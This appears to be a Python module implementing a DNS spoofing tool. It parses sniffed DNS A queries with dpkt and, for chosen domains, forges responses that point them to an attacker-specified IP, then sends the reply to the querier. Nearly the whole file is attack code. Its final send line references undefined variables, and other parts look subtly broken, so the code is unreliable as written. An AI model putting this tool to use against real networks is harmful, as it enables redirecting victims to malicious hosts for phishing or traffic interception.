import Libs.dpkt as dpkt
import socket

class objDomain(object):
    def __init__(self, dns, ip):
        self.dns = dns
        self.ip = ip

class dnsSpoof:
    def __init__(self):
        self.domains = []
        self.running = False

    def addDomain(self, dns, ip):
        self.domains += [objDomain(dns,ip)]

    def remDomain(self, dns):
        try:
            for i in range(0,len(self.domains)):
                if self.domains[i].dns == dns:
                    self.domains.pop(i)
        except(IndexError):
            pass

    def analyze(self,packet):
        dns = dpkt.dns.DNS(packet)
        for domain in self.domains:
            if domain.dns == dns.qd[0].name:
                if dns.qr != dpkt.dns.DNS_Q:
                    return
                if dns.opcode != dpkt.dns.DNS_QUERY:
                    return
                if len(dns.qd) != 1:
                    return
                if len(dns.an) != 0:
                    return
                if len(dns.ns) != 0:
                    return
                if dns.qd[0].cls != dpkt.dns.DNS_IN:
                    return
                if dns.qd[0].type != dpkt.dns.DNS_A:
                    return

                dns.op = dpkt.dns.DNS_RA
                dns.rcode = dpkt.dns.DNS_RCODE_NOERR
                dns.qr = dpkt.dns.DNS_R

                arr = dpkt.dns.DNS.RR()
                arr.cls = dpkt.dns.DNS_IN
                arr.type = dpkt.dns.DNS_A
                arr.name = dns.qd[0].name
                arr.ip = socket.inet_aton(domain.ip)

                dns.an.append(arr)

                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(str(data), (socket.inet_ntoa(ip.src), udp.sport))

